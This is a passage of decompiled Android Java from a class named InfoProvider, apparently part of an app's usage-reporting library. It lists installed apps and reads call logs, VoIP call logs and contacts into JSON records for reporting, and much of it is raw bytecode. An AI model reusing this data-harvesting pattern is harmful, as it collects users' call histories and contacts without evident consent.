package com.cootek.usage;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import java.util.HashSet;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

class InfoProvider
{
  private static final int INFO_APPS = 3;
  private static final int INFO_CALLHISTORY = 1;
  private static final int INFO_CALLVOIPHISTORY = 4;
  private static final int INFO_CONTACT = 0;
  private static final int INFO_LENGTH = 6;
  private static final int INFO_SMS = 2;
  private static final int INFO_TELEPHONENUMBER = 5;
  private static final String TYPE_INFO = "noah_info";
  AbsUsageAssist mAssist;
  
  InfoProvider(AbsUsageAssist paramAbsUsageAssist)
  {
    this.mAssist = paramAbsUsageAssist;
  }
  
  private String getAddressType(int paramInt)
  {
    switch (paramInt)
    {
    default: 
      return "";
    case 3: 
      return "OTHER";
    case 2: 
      return "WORK";
    case 1: 
      return "HOME";
    }
    return null;
  }
  
  private InfoData getApps()
  {
    InfoData localInfoData = new InfoData();
    Object localObject1 = this.mAssist.getContext().getPackageManager();
    int i = 0;
    List localList = ((PackageManager)localObject1).getInstalledPackages(0);
    JSONArray localJSONArray = new JSONArray();
    while (i < localList.size())
    {
      Object localObject2 = (PackageInfo)localList.get(i);
      if (((((PackageInfo)localObject2).applicationInfo.flags & 0x1) == 0) || ((((PackageInfo)localObject2).applicationInfo.flags & 0x80) != 0))
      {
        String str = ((PackageInfo)localObject2).applicationInfo.loadLabel((PackageManager)localObject1).toString();
        localObject2 = ((PackageInfo)localObject2).packageName;
        JSONObject localJSONObject = new JSONObject();
        try
        {
          localJSONObject.put("name", str);
          localJSONObject.put("package_name", localObject2);
          localJSONArray.put(localJSONObject);
          localInfoData.hasData = true;
        }
        catch (JSONException localJSONException2)
        {
          localJSONException2.printStackTrace();
        }
      }
      i += 1;
    }
    localObject1 = new JSONObject();
    try
    {
      ((JSONObject)localObject1).put("data", localJSONArray);
    }
    catch (JSONException localJSONException1)
    {
      localJSONException1.printStackTrace();
    }
    UsageData localUsageData = new UsageData();
    localUsageData.type = getType();
    localUsageData.path = getPath(3);
    localUsageData.value = ((JSONObject)localObject1).toString();
    localInfoData.data = localUsageData;
    localInfoData.infoPath = getPath(3);
    return localInfoData;
  }
  
  /* Error */
  private InfoData getCallHistory()
  {
    // Byte code:
    //   0: new 23	com/cootek/usage/InfoProvider$InfoData
    //   3: dup
    //   4: aload_0
    //   5: invokespecial 76	com/cootek/usage/InfoProvider$InfoData:<init>	(Lcom/cootek/usage/InfoProvider;)V
    //   8: astore 11
    //   10: aload_0
    //   11: getfield 58	com/cootek/usage/InfoProvider:mAssist	Lcom/cootek/usage/AbsUsageAssist;
    //   14: invokevirtual 82	com/cootek/usage/AbsUsageAssist:getContext	()Landroid/content/Context;
    //   17: invokevirtual 188	android/content/Context:getContentResolver	()Landroid/content/ContentResolver;
    //   20: astore 13
    //   22: new 96	org/json/JSONArray
    //   25: dup
    //   26: invokespecial 97	org/json/JSONArray:<init>	()V
    //   29: astore 12
    //   31: aconst_null
    //   32: astore 10
    //   34: aconst_null
    //   35: astore 9
    //   37: aconst_null
    //   38: astore 8
    //   40: aload 8
    //   42: astore 7
    //   44: invokestatic 194	com/cootek/usage/Settings:getInst	()Lcom/cootek/usage/Settings;
    //   47: aload_0
    //   48: iconst_1
    //   49: invokevirtual 166	com/cootek/usage/InfoProvider:getPath	(I)Ljava/lang/String;
    //   52: invokevirtual 198	com/cootek/usage/Settings:getLastInfoSuccessId	(Ljava/lang/String;)J
    //   55: lstore_2
    //   56: aload 8
    //   58: astore 7
    //   60: aload 13
    //   62: getstatic 204	android/provider/CallLog$Calls:CONTENT_URI	Landroid/net/Uri;
    //   65: bipush 6
    //   67: anewarray 206	java/lang/String
    //   70: dup
    //   71: iconst_0
    //   72: ldc -48
    //   74: aastore
    //   75: dup
    //   76: iconst_1
    //   77: ldc -46
    //   79: aastore
    //   80: dup
    //   81: iconst_2
    //   82: ldc -44
    //   84: aastore
    //   85: dup
    //   86: iconst_3
    //   87: ldc -42
    //   89: aastore
    //   90: dup
    //   91: iconst_4
    //   92: ldc -41
    //   94: aastore
    //   95: dup
    //   96: iconst_5
    //   97: ldc -120
    //   99: aastore
    //   100: ldc -39
    //   102: iconst_1
    //   103: anewarray 206	java/lang/String
    //   106: dup
    //   107: iconst_0
    //   108: lload_2
    //   109: invokestatic 221	java/lang/String:valueOf	(J)Ljava/lang/String;
    //   112: aastore
    //   113: ldc -33
    //   115: invokevirtual 229	android/content/ContentResolver:query	(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   118: astore 8
    //   120: aload 8
    //   122: ifnull +229 -> 351
    //   125: aload 8
    //   127: invokeinterface 235 1 0
    //   132: ifeq +219 -> 351
    //   135: aload 11
    //   137: aload 8
    //   139: iconst_0
    //   140: invokeinterface 239 2 0
    //   145: putfield 243	com/cootek/usage/InfoProvider$InfoData:lastId	J
    //   148: aload 8
    //   150: iconst_1
    //   151: invokeinterface 246 2 0
    //   156: astore 7
    //   158: aload 8
    //   160: iconst_2
    //   161: invokeinterface 239 2 0
    //   166: lstore 4
    //   168: aload 8
    //   170: iconst_3
    //   171: invokeinterface 239 2 0
    //   176: lstore_2
    //   177: aload 8
    //   179: iconst_4
    //   180: invokeinterface 250 2 0
    //   185: istore_1
    //   186: aload 8
    //   188: iconst_5
    //   189: invokeinterface 246 2 0
    //   194: astore 9
    //   196: new 133	org/json/JSONObject
    //   199: dup
    //   200: invokespecial 134	org/json/JSONObject:<init>	()V
    //   203: astore 10
    //   205: aload 10
    //   207: ldc -4
    //   209: aload 7
    //   211: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   214: pop
    //   215: aload 10
    //   217: ldc -44
    //   219: lload 4
    //   221: ldc2_w 253
    //   224: ldiv
    //   225: invokevirtual 257	org/json/JSONObject:put	(Ljava/lang/String;J)Lorg/json/JSONObject;
    //   228: pop
    //   229: iload_1
    //   230: iconst_2
    //   231: if_icmpne +11 -> 242
    //   234: ldc_w 259
    //   237: astore 7
    //   239: goto +8 -> 247
    //   242: ldc_w 261
    //   245: astore 7
    //   247: aload 10
    //   249: ldc -41
    //   251: aload 7
    //   253: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   256: pop
    //   257: iconst_3
    //   258: iload_1
    //   259: if_icmpne +5 -> 264
    //   262: lconst_0
    //   263: lstore_2
    //   264: aload 10
    //   266: ldc -42
    //   268: lload_2
    //   269: invokevirtual 257	org/json/JSONObject:put	(Ljava/lang/String;J)Lorg/json/JSONObject;
    //   272: pop
    //   273: aload 10
    //   275: ldc_w 263
    //   278: aload 9
    //   280: invokestatic 269	android/text/TextUtils:isEmpty	(Ljava/lang/CharSequence;)Z
    //   283: iconst_1
    //   284: ixor
    //   285: invokevirtual 272	org/json/JSONObject:put	(Ljava/lang/String;Z)Lorg/json/JSONObject;
    //   288: pop
    //   289: aload 12
    //   291: aload 10
    //   293: invokevirtual 145	org/json/JSONArray:put	(Ljava/lang/Object;)Lorg/json/JSONArray;
    //   296: pop
    //   297: aload 11
    //   299: iconst_1
    //   300: putfield 149	com/cootek/usage/InfoProvider$InfoData:hasData	Z
    //   303: goto +15 -> 318
    //   306: astore 7
    //   308: goto +5 -> 313
    //   311: astore 7
    //   313: aload 7
    //   315: invokevirtual 152	org/json/JSONException:printStackTrace	()V
    //   318: aload 8
    //   320: invokeinterface 275 1 0
    //   325: istore 6
    //   327: iload 6
    //   329: ifne +6 -> 335
    //   332: goto +19 -> 351
    //   335: goto -187 -> 148
    //   338: astore 7
    //   340: goto +222 -> 562
    //   343: astore 9
    //   345: goto +138 -> 483
    //   348: goto +179 -> 527
    //   351: aload 8
    //   353: ifnull +20 -> 373
    //   356: aload 8
    //   358: invokeinterface 278 1 0
    //   363: goto +10 -> 373
    //   366: astore 7
    //   368: aload 7
    //   370: invokevirtual 279	java/lang/RuntimeException:printStackTrace	()V
    //   373: new 133	org/json/JSONObject
    //   376: dup
    //   377: invokespecial 134	org/json/JSONObject:<init>	()V
    //   380: astore 7
    //   382: aload 7
    //   384: ldc -102
    //   386: aload 12
    //   388: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   391: pop
    //   392: goto +10 -> 402
    //   395: astore 8
    //   397: aload 8
    //   399: invokevirtual 152	org/json/JSONException:printStackTrace	()V
    //   402: new 156	com/cootek/usage/UsageData
    //   405: dup
    //   406: invokespecial 157	com/cootek/usage/UsageData:<init>	()V
    //   409: astore 8
    //   411: aload 8
    //   413: aload_0
    //   414: invokevirtual 160	com/cootek/usage/InfoProvider:getType	()Ljava/lang/String;
    //   417: putfield 163	com/cootek/usage/UsageData:type	Ljava/lang/String;
    //   420: aload 8
    //   422: aload_0
    //   423: iconst_1
    //   424: invokevirtual 166	com/cootek/usage/InfoProvider:getPath	(I)Ljava/lang/String;
    //   427: putfield 169	com/cootek/usage/UsageData:path	Ljava/lang/String;
    //   430: aload 8
    //   432: aload 7
    //   434: invokevirtual 170	org/json/JSONObject:toString	()Ljava/lang/String;
    //   437: putfield 173	com/cootek/usage/UsageData:value	Ljava/lang/String;
    //   440: aload 11
    //   442: aload 8
    //   444: putfield 176	com/cootek/usage/InfoProvider$InfoData:data	Lcom/cootek/usage/UsageData;
    //   447: aload 11
    //   449: aload_0
    //   450: iconst_1
    //   451: invokevirtual 166	com/cootek/usage/InfoProvider:getPath	(I)Ljava/lang/String;
    //   454: putfield 179	com/cootek/usage/InfoProvider$InfoData:infoPath	Ljava/lang/String;
    //   457: aload 11
    //   459: areturn
    //   460: astore 8
    //   462: aload 7
    //   464: astore 9
    //   466: aload 8
    //   468: astore 7
    //   470: aload 9
    //   472: astore 8
    //   474: goto +88 -> 562
    //   477: astore 9
    //   479: aload 10
    //   481: astore 8
    //   483: aload 8
    //   485: astore 7
    //   487: aload 9
    //   489: invokevirtual 279	java/lang/RuntimeException:printStackTrace	()V
    //   492: aload 8
    //   494: astore 7
    //   496: aload 11
    //   498: iconst_0
    //   499: putfield 149	com/cootek/usage/InfoProvider$InfoData:hasData	Z
    //   502: aload 8
    //   504: ifnull +20 -> 524
    //   507: aload 8
    //   509: invokeinterface 278 1 0
    //   514: aload 11
    //   516: areturn
    //   517: astore 7
    //   519: aload 7
    //   521: invokevirtual 279	java/lang/RuntimeException:printStackTrace	()V
    //   524: aload 11
    //   526: areturn
    //   527: aload 8
    //   529: astore 7
    //   531: aload 11
    //   533: iconst_0
    //   534: putfield 149	com/cootek/usage/InfoProvider$InfoData:hasData	Z
    //   537: aload 8
    //   539: ifnull +20 -> 559
    //   542: aload 8
    //   544: invokeinterface 278 1 0
    //   549: aload 11
    //   551: areturn
    //   552: astore 7
    //   554: aload 7
    //   556: invokevirtual 279	java/lang/RuntimeException:printStackTrace	()V
    //   559: aload 11
    //   561: areturn
    //   562: aload 8
    //   564: ifnull +20 -> 584
    //   567: aload 8
    //   569: invokeinterface 278 1 0
    //   574: goto +10 -> 584
    //   577: astore 8
    //   579: aload 8
    //   581: invokevirtual 279	java/lang/RuntimeException:printStackTrace	()V
    //   584: aload 7
    //   586: athrow
    //   587: astore 7
    //   589: aload 9
    //   591: astore 8
    //   593: goto -66 -> 527
    //   596: astore 7
    //   598: goto -250 -> 348
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	601	0	this	InfoProvider
    //   185	75	1	i	int
    //   55	214	2	l1	long
    //   166	54	4	l2	long
    //   325	3	6	bool	boolean
    //   42	210	7	localObject1	Object
    //   306	1	7	localJSONException1	JSONException
    //   311	3	7	localJSONException2	JSONException
    //   338	1	7	localObject2	Object
    //   366	3	7	localRuntimeException1	RuntimeException
    //   380	115	7	localObject3	Object
    //   517	3	7	localRuntimeException2	RuntimeException
    //   529	1	7	localObject4	Object
    //   552	33	7	localRuntimeException3	RuntimeException
    //   587	1	7	localSecurityException1	SecurityException
    //   596	1	7	localSecurityException2	SecurityException
    //   38	319	8	localCursor	android.database.Cursor
    //   395	3	8	localJSONException3	JSONException
    //   409	34	8	localUsageData	UsageData
    //   460	7	8	localObject5	Object
    //   472	96	8	localObject6	Object
    //   577	3	8	localRuntimeException4	RuntimeException
    //   591	1	8	localRuntimeException5	RuntimeException
    //   35	244	9	str	String
    //   343	1	9	localRuntimeException6	RuntimeException
    //   464	7	9	localObject7	Object
    //   477	113	9	localRuntimeException7	RuntimeException
    //   32	448	10	localJSONObject	JSONObject
    //   8	552	11	localInfoData	InfoData
    //   29	358	12	localJSONArray	JSONArray
    //   20	41	13	localContentResolver	android.content.ContentResolver
    // Exception table:
    //   from	to	target	type
    //   264	303	306	org/json/JSONException
    //   205	229	311	org/json/JSONException
    //   247	257	311	org/json/JSONException
    //   125	148	338	finally
    //   148	205	338	finally
    //   205	229	338	finally
    //   247	257	338	finally
    //   264	303	338	finally
    //   313	318	338	finally
    //   318	327	338	finally
    //   125	148	343	java/lang/RuntimeException
    //   148	205	343	java/lang/RuntimeException
    //   205	229	343	java/lang/RuntimeException
    //   247	257	343	java/lang/RuntimeException
    //   264	303	343	java/lang/RuntimeException
    //   313	318	343	java/lang/RuntimeException
    //   318	327	343	java/lang/RuntimeException
    //   356	363	366	java/lang/RuntimeException
    //   382	392	395	org/json/JSONException
    //   44	56	460	finally
    //   60	120	460	finally
    //   487	492	460	finally
    //   496	502	460	finally
    //   531	537	460	finally
    //   44	56	477	java/lang/RuntimeException
    //   60	120	477	java/lang/RuntimeException
    //   507	514	517	java/lang/RuntimeException
    //   542	549	552	java/lang/RuntimeException
    //   567	574	577	java/lang/RuntimeException
    //   44	56	587	java/lang/SecurityException
    //   60	120	587	java/lang/SecurityException
    //   125	148	596	java/lang/SecurityException
    //   148	205	596	java/lang/SecurityException
    //   205	229	596	java/lang/SecurityException
    //   247	257	596	java/lang/SecurityException
    //   264	303	596	java/lang/SecurityException
    //   313	318	596	java/lang/SecurityException
    //   318	327	596	java/lang/SecurityException
  }
  
  /* Error */
  private InfoData getCallVoipHistory()
  {
    // Byte code:
    //   0: new 23	com/cootek/usage/InfoProvider$InfoData
    //   3: dup
    //   4: aload_0
    //   5: invokespecial 76	com/cootek/usage/InfoProvider$InfoData:<init>	(Lcom/cootek/usage/InfoProvider;)V
    //   8: astore 13
    //   10: aload_0
    //   11: getfield 58	com/cootek/usage/InfoProvider:mAssist	Lcom/cootek/usage/AbsUsageAssist;
    //   14: invokevirtual 82	com/cootek/usage/AbsUsageAssist:getContext	()Landroid/content/Context;
    //   17: invokevirtual 188	android/content/Context:getContentResolver	()Landroid/content/ContentResolver;
    //   20: astore 10
    //   22: new 96	org/json/JSONArray
    //   25: dup
    //   26: invokespecial 97	org/json/JSONArray:<init>	()V
    //   29: astore 12
    //   31: ldc_w 282
    //   34: invokestatic 288	android/net/Uri:parse	(Ljava/lang/String;)Landroid/net/Uri;
    //   37: astore 11
    //   39: invokestatic 194	com/cootek/usage/Settings:getInst	()Lcom/cootek/usage/Settings;
    //   42: aload_0
    //   43: iconst_1
    //   44: invokevirtual 166	com/cootek/usage/InfoProvider:getPath	(I)Ljava/lang/String;
    //   47: invokevirtual 198	com/cootek/usage/Settings:getLastInfoSuccessId	(Ljava/lang/String;)J
    //   50: lstore_3
    //   51: aload 10
    //   53: aload 11
    //   55: bipush 7
    //   57: anewarray 206	java/lang/String
    //   60: dup
    //   61: iconst_0
    //   62: ldc -48
    //   64: aastore
    //   65: dup
    //   66: iconst_1
    //   67: ldc -46
    //   69: aastore
    //   70: dup
    //   71: iconst_2
    //   72: ldc -44
    //   74: aastore
    //   75: dup
    //   76: iconst_3
    //   77: ldc -42
    //   79: aastore
    //   80: dup
    //   81: iconst_4
    //   82: ldc -41
    //   84: aastore
    //   85: dup
    //   86: iconst_5
    //   87: ldc_w 290
    //   90: aastore
    //   91: dup
    //   92: bipush 6
    //   94: ldc_w 292
    //   97: aastore
    //   98: ldc -39
    //   100: iconst_1
    //   101: anewarray 206	java/lang/String
    //   104: dup
    //   105: iconst_0
    //   106: lload_3
    //   107: invokestatic 221	java/lang/String:valueOf	(J)Ljava/lang/String;
    //   110: aastore
    //   111: ldc -33
    //   113: invokevirtual 229	android/content/ContentResolver:query	(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   116: astore 10
    //   118: aload 10
    //   120: ifnull +337 -> 457
    //   123: aload 10
    //   125: invokeinterface 235 1 0
    //   130: ifeq +327 -> 457
    //   133: aload 13
    //   135: aload 10
    //   137: iconst_0
    //   138: invokeinterface 239 2 0
    //   143: putfield 243	com/cootek/usage/InfoProvider$InfoData:lastId	J
    //   146: aload 10
    //   148: iconst_1
    //   149: invokeinterface 246 2 0
    //   154: astore 11
    //   156: aload 10
    //   158: iconst_2
    //   159: invokeinterface 239 2 0
    //   164: lstore 7
    //   166: aload 10
    //   168: iconst_3
    //   169: invokeinterface 239 2 0
    //   174: lstore_3
    //   175: aload 10
    //   177: iconst_4
    //   178: invokeinterface 250 2 0
    //   183: istore_1
    //   184: aload 10
    //   186: iconst_5
    //   187: invokeinterface 239 2 0
    //   192: lstore 5
    //   194: aload 10
    //   196: bipush 6
    //   198: invokeinterface 250 2 0
    //   203: istore_2
    //   204: new 133	org/json/JSONObject
    //   207: dup
    //   208: invokespecial 134	org/json/JSONObject:<init>	()V
    //   211: astore 14
    //   213: aload 14
    //   215: ldc -4
    //   217: aload 11
    //   219: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   222: pop
    //   223: aload 14
    //   225: ldc -44
    //   227: lload 7
    //   229: ldc2_w 253
    //   232: ldiv
    //   233: invokevirtual 257	org/json/JSONObject:put	(Ljava/lang/String;J)Lorg/json/JSONObject;
    //   236: pop
    //   237: iconst_3
    //   238: iload_1
    //   239: if_icmpne +459 -> 698
    //   242: lconst_0
    //   243: lstore_3
    //   244: goto +3 -> 247
    //   247: aload 14
    //   249: ldc -42
    //   251: lload_3
    //   252: invokevirtual 257	org/json/JSONObject:put	(Ljava/lang/String;J)Lorg/json/JSONObject;
    //   255: pop
    //   256: lload 5
    //   258: lconst_0
    //   259: lcmp
    //   260: ifeq +441 -> 701
    //   263: iconst_1
    //   264: istore 9
    //   266: goto +3 -> 269
    //   269: aload 14
    //   271: ldc_w 263
    //   274: iload 9
    //   276: invokevirtual 272	org/json/JSONObject:put	(Ljava/lang/String;Z)Lorg/json/JSONObject;
    //   279: pop
    //   280: iload_1
    //   281: iconst_2
    //   282: if_icmpne +16 -> 298
    //   285: ldc_w 259
    //   288: astore 11
    //   290: goto +13 -> 303
    //   293: astore 11
    //   295: goto +116 -> 411
    //   298: ldc_w 261
    //   301: astore 11
    //   303: aload 14
    //   305: ldc -41
    //   307: aload 11
    //   309: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   312: pop
    //   313: iload_2
    //   314: ifne +18 -> 332
    //   317: aload 14
    //   319: ldc_w 294
    //   322: ldc_w 296
    //   325: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   328: pop
    //   329: goto +378 -> 707
    //   332: iload_2
    //   333: iconst_1
    //   334: if_icmpne +18 -> 352
    //   337: aload 14
    //   339: ldc_w 294
    //   342: ldc_w 298
    //   345: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   348: pop
    //   349: goto +358 -> 707
    //   352: iload_2
    //   353: iconst_2
    //   354: if_icmpne +18 -> 372
    //   357: aload 14
    //   359: ldc_w 294
    //   362: ldc_w 300
    //   365: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   368: pop
    //   369: goto +338 -> 707
    //   372: iload_2
    //   373: iconst_3
    //   374: if_icmpne +18 -> 392
    //   377: aload 14
    //   379: ldc_w 294
    //   382: ldc_w 302
    //   385: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   388: pop
    //   389: goto +3 -> 392
    //   392: aload 12
    //   394: aload 14
    //   396: invokevirtual 145	org/json/JSONArray:put	(Ljava/lang/Object;)Lorg/json/JSONArray;
    //   399: pop
    //   400: aload 13
    //   402: iconst_1
    //   403: putfield 149	com/cootek/usage/InfoProvider$InfoData:hasData	Z
    //   406: goto +10 -> 416
    //   409: astore 11
    //   411: aload 11
    //   413: invokevirtual 152	org/json/JSONException:printStackTrace	()V
    //   416: aload 10
    //   418: invokeinterface 275 1 0
    //   423: istore 9
    //   425: iload 9
    //   427: ifne +6 -> 433
    //   430: goto +27 -> 457
    //   433: goto -287 -> 146
    //   436: astore 11
    //   438: goto +225 -> 663
    //   441: astore 12
    //   443: aload 10
    //   445: astore 11
    //   447: goto +132 -> 579
    //   450: aload 10
    //   452: astore 11
    //   454: goto +172 -> 626
    //   457: aload 10
    //   459: ifnull +20 -> 479
    //   462: aload 10
    //   464: invokeinterface 278 1 0
    //   469: goto +10 -> 479
    //   472: astore 10
    //   474: aload 10
    //   476: invokevirtual 279	java/lang/RuntimeException:printStackTrace	()V
    //   479: new 133	org/json/JSONObject
    //   482: dup
    //   483: invokespecial 134	org/json/JSONObject:<init>	()V
    //   486: astore 10
    //   488: aload 10
    //   490: ldc -102
    //   492: aload 12
    //   494: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   497: pop
    //   498: goto +10 -> 508
    //   501: astore 11
    //   503: aload 11
    //   505: invokevirtual 152	org/json/JSONException:printStackTrace	()V
    //   508: new 156	com/cootek/usage/UsageData
    //   511: dup
    //   512: invokespecial 157	com/cootek/usage/UsageData:<init>	()V
    //   515: astore 11
    //   517: aload 11
    //   519: aload_0
    //   520: invokevirtual 160	com/cootek/usage/InfoProvider:getType	()Ljava/lang/String;
    //   523: putfield 163	com/cootek/usage/UsageData:type	Ljava/lang/String;
    //   526: aload 11
    //   528: aload_0
    //   529: iconst_4
    //   530: invokevirtual 166	com/cootek/usage/InfoProvider:getPath	(I)Ljava/lang/String;
    //   533: putfield 169	com/cootek/usage/UsageData:path	Ljava/lang/String;
    //   536: aload 11
    //   538: aload 10
    //   540: invokevirtual 170	org/json/JSONObject:toString	()Ljava/lang/String;
    //   543: putfield 173	com/cootek/usage/UsageData:value	Ljava/lang/String;
    //   546: aload 13
    //   548: aload 11
    //   550: putfield 176	com/cootek/usage/InfoProvider$InfoData:data	Lcom/cootek/usage/UsageData;
    //   553: aload 13
    //   555: aload_0
    //   556: iconst_4
    //   557: invokevirtual 166	com/cootek/usage/InfoProvider:getPath	(I)Ljava/lang/String;
    //   560: putfield 179	com/cootek/usage/InfoProvider$InfoData:infoPath	Ljava/lang/String;
    //   563: aload 13
    //   565: areturn
    //   566: astore 11
    //   568: aconst_null
    //   569: astore 10
    //   571: goto +92 -> 663
    //   574: astore 12
    //   576: aconst_null
    //   577: astore 11
    //   579: aload 11
    //   581: astore 10
    //   583: aload 12
    //   585: invokevirtual 279	java/lang/RuntimeException:printStackTrace	()V
    //   588: aload 11
    //   590: astore 10
    //   592: aload 13
    //   594: iconst_0
    //   595: putfield 149	com/cootek/usage/InfoProvider$InfoData:hasData	Z
    //   598: aload 11
    //   600: ifnull +20 -> 620
    //   603: aload 11
    //   605: invokeinterface 278 1 0
    //   610: aload 13
    //   612: areturn
    //   613: astore 10
    //   615: aload 10
    //   617: invokevirtual 279	java/lang/RuntimeException:printStackTrace	()V
    //   620: aload 13
    //   622: areturn
    //   623: aconst_null
    //   624: astore 11
    //   626: aload 11
    //   628: astore 10
    //   630: aload 13
    //   632: iconst_0
    //   633: putfield 149	com/cootek/usage/InfoProvider$InfoData:hasData	Z
    //   636: aload 11
    //   638: ifnull +20 -> 658
    //   641: aload 11
    //   643: invokeinterface 278 1 0
    //   648: aload 13
    //   650: areturn
    //   651: astore 10
    //   653: aload 10
    //   655: invokevirtual 279	java/lang/RuntimeException:printStackTrace	()V
    //   658: aload 13
    //   660: areturn
    //   661: astore 11
    //   663: aload 10
    //   665: ifnull +20 -> 685
    //   668: aload 10
    //   670: invokeinterface 278 1 0
    //   675: goto +10 -> 685
    //   678: astore 10
    //   680: aload 10
    //   682: invokevirtual 279	java/lang/RuntimeException:printStackTrace	()V
    //   685: aload 11
    //   687: athrow
    //   688: astore 10
    //   690: goto -67 -> 623
    //   693: astore 11
    //   695: goto -245 -> 450
    //   698: goto -451 -> 247
    //   701: iconst_0
    //   702: istore 9
    //   704: goto -435 -> 269
    //   707: goto -315 -> 392
    //   710: astore 11
    //   712: goto -301 -> 411
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	715	0	this	InfoProvider
    //   183	100	1	i	int
    //   203	172	2	j	int
    //   50	202	3	l1	long
    //   192	65	5	l2	long
    //   164	64	7	l3	long
    //   264	439	9	bool	boolean
    //   20	443	10	localObject1	Object
    //   472	3	10	localRuntimeException1	RuntimeException
    //   486	105	10	localObject2	Object
    //   613	3	10	localRuntimeException2	RuntimeException
    //   628	1	10	localObject3	Object
    //   651	18	10	localRuntimeException3	RuntimeException
    //   678	3	10	localRuntimeException4	RuntimeException
    //   688	1	10	localSecurityException1	SecurityException
    //   37	252	11	localObject4	Object
    //   293	1	11	localJSONException1	JSONException
    //   301	7	11	str	String
    //   409	3	11	localJSONException2	JSONException
    //   436	1	11	localObject5	Object
    //   445	8	11	localObject6	Object
    //   501	3	11	localJSONException3	JSONException
    //   515	34	11	localUsageData	UsageData
    //   566	1	11	localObject7	Object
    //   577	65	11	localObject8	Object
    //   661	25	11	localObject9	Object
    //   693	1	11	localSecurityException2	SecurityException
    //   710	1	11	localJSONException4	JSONException
    //   29	364	12	localJSONArray	JSONArray
    //   441	52	12	localRuntimeException5	RuntimeException
    //   574	10	12	localRuntimeException6	RuntimeException
    //   8	651	13	localInfoData	InfoData
    //   211	184	14	localJSONObject	JSONObject
    // Exception table:
    //   from	to	target	type
    //   317	329	293	org/json/JSONException
    //   337	349	293	org/json/JSONException
    //   357	369	293	org/json/JSONException
    //   213	237	409	org/json/JSONException
    //   247	256	409	org/json/JSONException
    //   269	280	409	org/json/JSONException
    //   303	313	409	org/json/JSONException
    //   123	146	436	finally
    //   146	213	436	finally
    //   213	237	436	finally
    //   247	256	436	finally
    //   269	280	436	finally
    //   303	313	436	finally
    //   317	329	436	finally
    //   337	349	436	finally
    //   357	369	436	finally
    //   377	389	436	finally
    //   392	406	436	finally
    //   411	416	436	finally
    //   416	425	436	finally
    //   123	146	441	java/lang/RuntimeException
    //   146	213	441	java/lang/RuntimeException
    //   213	237	441	java/lang/RuntimeException
    //   247	256	441	java/lang/RuntimeException
    //   269	280	441	java/lang/RuntimeException
    //   303	313	441	java/lang/RuntimeException
    //   317	329	441	java/lang/RuntimeException
    //   337	349	441	java/lang/RuntimeException
    //   357	369	441	java/lang/RuntimeException
    //   377	389	441	java/lang/RuntimeException
    //   392	406	441	java/lang/RuntimeException
    //   411	416	441	java/lang/RuntimeException
    //   416	425	441	java/lang/RuntimeException
    //   462	469	472	java/lang/RuntimeException
    //   488	498	501	org/json/JSONException
    //   31	118	566	finally
    //   31	118	574	java/lang/RuntimeException
    //   603	610	613	java/lang/RuntimeException
    //   641	648	651	java/lang/RuntimeException
    //   583	588	661	finally
    //   592	598	661	finally
    //   630	636	661	finally
    //   668	675	678	java/lang/RuntimeException
    //   31	118	688	java/lang/SecurityException
    //   123	146	693	java/lang/SecurityException
    //   146	213	693	java/lang/SecurityException
    //   213	237	693	java/lang/SecurityException
    //   247	256	693	java/lang/SecurityException
    //   269	280	693	java/lang/SecurityException
    //   303	313	693	java/lang/SecurityException
    //   317	329	693	java/lang/SecurityException
    //   337	349	693	java/lang/SecurityException
    //   357	369	693	java/lang/SecurityException
    //   377	389	693	java/lang/SecurityException
    //   392	406	693	java/lang/SecurityException
    //   411	416	693	java/lang/SecurityException
    //   416	425	693	java/lang/SecurityException
    //   377	389	710	org/json/JSONException
    //   392	406	710	org/json/JSONException
  }
  
  /* Error */
  private InfoData getContact()
  {
    // Byte code:
    //   0: new 23	com/cootek/usage/InfoProvider$InfoData
    //   3: dup
    //   4: aload_0
    //   5: invokespecial 76	com/cootek/usage/InfoProvider$InfoData:<init>	(Lcom/cootek/usage/InfoProvider;)V
    //   8: astore 10
    //   10: aload_0
    //   11: getfield 58	com/cootek/usage/InfoProvider:mAssist	Lcom/cootek/usage/AbsUsageAssist;
    //   14: invokevirtual 82	com/cootek/usage/AbsUsageAssist:getContext	()Landroid/content/Context;
    //   17: invokevirtual 188	android/content/Context:getContentResolver	()Landroid/content/ContentResolver;
    //   20: astore 12
    //   22: new 305	java/util/Hashtable
    //   25: dup
    //   26: invokespecial 306	java/util/Hashtable:<init>	()V
    //   29: astore 11
    //   31: aconst_null
    //   32: astore 6
    //   34: aconst_null
    //   35: astore 5
    //   37: aconst_null
    //   38: astore_3
    //   39: aconst_null
    //   40: astore 8
    //   42: aconst_null
    //   43: astore 9
    //   45: aconst_null
    //   46: astore 7
    //   48: aload 12
    //   50: getstatic 309	android/provider/ContactsContract$Contacts:CONTENT_URI	Landroid/net/Uri;
    //   53: iconst_2
    //   54: anewarray 206	java/lang/String
    //   57: dup
    //   58: iconst_0
    //   59: ldc -48
    //   61: aastore
    //   62: dup
    //   63: iconst_1
    //   64: ldc_w 311
    //   67: aastore
